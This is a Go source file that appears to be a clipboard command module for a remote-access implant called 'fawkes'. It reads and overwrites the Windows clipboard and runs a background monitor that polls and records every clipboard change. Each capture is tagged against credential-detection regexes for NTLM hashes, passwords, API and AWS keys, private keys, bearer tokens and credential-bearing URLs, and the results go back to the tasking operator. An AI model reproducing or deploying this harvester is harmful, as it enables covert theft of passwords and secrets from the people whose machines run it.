//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	user32CB              = windows.NewLazySystemDLL("user32.dll")
	kernel32CB            = windows.NewLazySystemDLL("kernel32.dll")
	procOpenClipboard     = user32CB.NewProc("OpenClipboard")
	procCloseClipboard    = user32CB.NewProc("CloseClipboard")
	procGetClipboardData  = user32CB.NewProc("GetClipboardData")
	procSetClipboardData  = user32CB.NewProc("SetClipboardData")
	procEmptyClipboard    = user32CB.NewProc("EmptyClipboard")
	procGlobalAlloc       = kernel32CB.NewProc("GlobalAlloc")
	procGlobalFree        = kernel32CB.NewProc("GlobalFree")
	procGlobalLock        = kernel32CB.NewProc("GlobalLock")
	procGlobalUnlock      = kernel32CB.NewProc("GlobalUnlock")
)

const (
	cfUnicodeText = 13
	gmemMoveable  = 0x0002
)

type ClipboardCommand struct{}

func (c *ClipboardCommand) Name() string {
	return "clipboard"
}

func (c *ClipboardCommand) Description() string {
	return "Read, write, or monitor Windows clipboard contents"
}

type ClipboardParams struct {
	Action   string `json:"action"`
	Data     string `json:"data"`
	Interval int    `json:"interval"`
}

func (c *ClipboardCommand) Execute(task structs.Task) structs.CommandResult {
	var params ClipboardParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch params.Action {
	case "read":
		return readClipboard()
	case "write":
		if params.Data == "" {
			return structs.CommandResult{
				Output:    "Error: 'data' parameter is required for write action",
				Status:    "error",
				Completed: true,
			}
		}
		return writeClipboard(params.Data)
	case "monitor":
		return clipMonitorStart(params.Interval)
	case "stop":
		return clipMonitorStop()
	case "dump":
		return clipMonitorDump()
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use 'read', 'write', 'monitor', 'dump', or 'stop')", params.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func readClipboard() structs.CommandResult {
	ret, _, err := procOpenClipboard.Call(0)
	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open clipboard: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCloseClipboard.Call()

	handle, _, _ := procGetClipboardData.Call(cfUnicodeText)
	if handle == 0 {
		return structs.CommandResult{
			Output:    "Clipboard is empty or does not contain text",
			Status:    "success",
			Completed: true,
		}
	}

	ptr, _, err := procGlobalLock.Call(handle)
	if ptr == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to lock clipboard memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procGlobalUnlock.Call(handle)

	text := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))

	if text == "" {
		return structs.CommandResult{
			Output:    "Clipboard is empty",
			Status:    "success",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Clipboard contents (%d chars):\n%s", len(text), text),
		Status:    "success",
		Completed: true,
	}
}

func writeClipboard(text string) structs.CommandResult {
	utf16Text, err := syscall.UTF16FromString(text)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to encode text: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	size := len(utf16Text) * 2

	hMem, _, err := procGlobalAlloc.Call(gmemMoveable, uintptr(size))
	if hMem == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to allocate memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	ptr, _, err := procGlobalLock.Call(hMem)
	if ptr == 0 {
		procGlobalFree.Call(hMem)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to lock memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	src := unsafe.Pointer(&utf16Text[0])
	dst := unsafe.Pointer(ptr)
	copy(
		unsafe.Slice((*byte)(dst), size),
		unsafe.Slice((*byte)(src), size),
	)

	procGlobalUnlock.Call(hMem)

	ret, _, err := procOpenClipboard.Call(0)
	if ret == 0 {
		procGlobalFree.Call(hMem)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open clipboard: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCloseClipboard.Call()

	procEmptyClipboard.Call()

	// On success, system takes ownership of hMem. On failure, we must free.
	ret, _, err = procSetClipboardData.Call(cfUnicodeText, hMem)
	if ret == 0 {
		procGlobalFree.Call(hMem)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to set clipboard data: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully wrote %d characters to clipboard", len(text)),
		Status:    "success",
		Completed: true,
	}
}

// --- Clipboard Monitor ---

type clipEntry struct {
	Timestamp time.Time
	Content   string
	Tags      []string
}

type clipMonitorState struct {
	mu        sync.Mutex
	running   bool
	stopCh    chan struct{}
	startTime time.Time
	lastText  string
	entries   []clipEntry
}

var cm = &clipMonitorState{}

// Credential pattern detectors
var credPatterns = []struct {
	Name    string
	Pattern *regexp.Regexp
}{
	{"NTLM Hash", regexp.MustCompile(`(?i)[a-f0-9]{32}:[a-f0-9]{32}`)},
	{"NT Hash", regexp.MustCompile(`^[a-f0-9]{32}$`)},
	{"Password-like", regexp.MustCompile(`(?i)(password|passwd|pwd)\s*[:=]\s*\S+`)},
	{"API Key", regexp.MustCompile(`(?i)(api[_-]?key|apikey|api[_-]?token|access[_-]?token)\s*[:=]\s*\S+`)},
	{"AWS Key", regexp.MustCompile(`AKIA[0-9A-Z]{16}`)},
	{"Private Key", regexp.MustCompile(`-----BEGIN\s+(RSA|EC|OPENSSH|DSA)?\s*PRIVATE KEY-----`)},
	{"Bearer Token", regexp.MustCompile(`(?i)bearer\s+[a-zA-Z0-9_\-.~+/]+=*`)},
	{"Connection String", regexp.MustCompile(`(?i)(server|data source|host)=[^;]+;.*(password|pwd)=[^;]+`)},
	{"Base64 Blob", regexp.MustCompile(`^[A-Za-z0-9+/]{40,}={0,2}$`)},
	{"UNC Path", regexp.MustCompile(`\\\\[a-zA-Z0-9._-]+\\[a-zA-Z0-9$._-]+`)},
	{"URL with Creds", regexp.MustCompile(`(?i)https?://[^:]+:[^@]+@`)},
	{"IP Address", regexp.MustCompile(`\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b`)},
}

func clipMonitorStart(intervalSec int) structs.CommandResult {
	cm.mu.Lock()
	if cm.running {
		cm.mu.Unlock()
		return structs.CommandResult{
			Output:    "Clipboard monitor is already running. Use 'dump' to view or 'stop' to stop.",
			Status:    "error",
			Completed: true,
		}
	}

	if intervalSec <= 0 {
		intervalSec = 3
	}

	cm.running = true
	cm.startTime = time.Now()
	cm.entries = nil
	cm.lastText = ""
	cm.stopCh = make(chan struct{})
	cm.mu.Unlock()

	// Capture initial clipboard state
	clipReadIntoMonitor()

	go clipMonitorLoop(intervalSec)

	return structs.CommandResult{
		Output:    fmt.Sprintf("Clipboard monitor started (polling every %ds). Use 'dump' to view captures, 'stop' to stop.", intervalSec),
		Status:    "success",
		Completed: true,
	}
}

func clipMonitorStop() structs.CommandResult {
	cm.mu.Lock()
	if !cm.running {
		cm.mu.Unlock()
		return structs.CommandResult{
			Output:    "Clipboard monitor is not running",
			Status:    "error",
			Completed: true,
		}
	}

	close(cm.stopCh)
	cm.running = false

	duration := time.Since(cm.startTime)
	entries := make([]clipEntry, len(cm.entries))
	copy(entries, cm.entries)
	cm.entries = nil
	cm.mu.Unlock()

	output := formatClipEntries(entries, duration, true)
	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

func clipMonitorDump() structs.CommandResult {
	cm.mu.Lock()
	if !cm.running {
		cm.mu.Unlock()
		return structs.CommandResult{
			Output:    "Clipboard monitor is not running",
			Status:    "error",
			Completed: true,
		}
	}

	duration := time.Since(cm.startTime)
	entries := make([]clipEntry, len(cm.entries))
	copy(entries, cm.entries)
	cm.mu.Unlock()

	output := formatClipEntries(entries, duration, false)
	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

func clipMonitorLoop(intervalSec int) {
	ticker := time.NewTicker(time.Duration(intervalSec) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-cm.stopCh:
			return
		case <-ticker.C:
			clipReadIntoMonitor()
		}
	}
}

func clipReadIntoMonitor() {
	text := clipReadText()
	if text == "" {
		return
	}

	cm.mu.Lock()
	defer cm.mu.Unlock()

	if text == cm.lastText {
		return
	}
	cm.lastText = text

	tags := detectCredPatterns(text)
	cm.entries = append(cm.entries, clipEntry{
		Timestamp: time.Now(),
		Content:   text,
		Tags:      tags,
	})
}

func clipReadText() string {
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return ""
	}
	defer procCloseClipboard.Call()

	handle, _, _ := procGetClipboardData.Call(cfUnicodeText)
	if handle == 0 {
		return ""
	}

	ptr, _, _ := procGlobalLock.Call(handle)
	if ptr == 0 {
		return ""
	}
	defer procGlobalUnlock.Call(handle)

	return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))
}

func detectCredPatterns(text string) []string {
	var tags []string
	seen := make(map[string]bool)

	for _, cp := range credPatterns {
		if cp.Pattern.MatchString(text) && !seen[cp.Name] {
			tags = append(tags, cp.Name)
			seen[cp.Name] = true
		}
	}
	return tags
}

func formatClipEntries(entries []clipEntry, duration time.Duration, stopped bool) string {
	var sb strings.Builder

	if stopped {
		sb.WriteString("Clipboard monitor stopped.\n")
	} else {
		sb.WriteString("Clipboard monitor running.\n")
	}
	sb.WriteString(fmt.Sprintf("Duration: %s | Captures: %d\n", duration.Round(time.Second), len(entries)))

	if len(entries) == 0 {
		sb.WriteString("\nNo clipboard changes captured.")
		return sb.String()
	}

	sb.WriteString("\n")
	for i, e := range entries {
		sb.WriteString(fmt.Sprintf("--- Capture #%d [%s] ---\n", i+1, e.Timestamp.Format("15:04:05")))

		if len(e.Tags) > 0 {
			sb.WriteString(fmt.Sprintf("  Tags: %s\n", strings.Join(e.Tags, ", ")))
		}

		// Truncate very long entries for display
		content := e.Content
		if len(content) > 2000 {
			content = content[:2000] + fmt.Sprintf("\n... (%d chars total, truncated)", len(e.Content))
		}
		sb.WriteString(content)
		sb.WriteString("\n\n")
	}

	return sb.String()
}
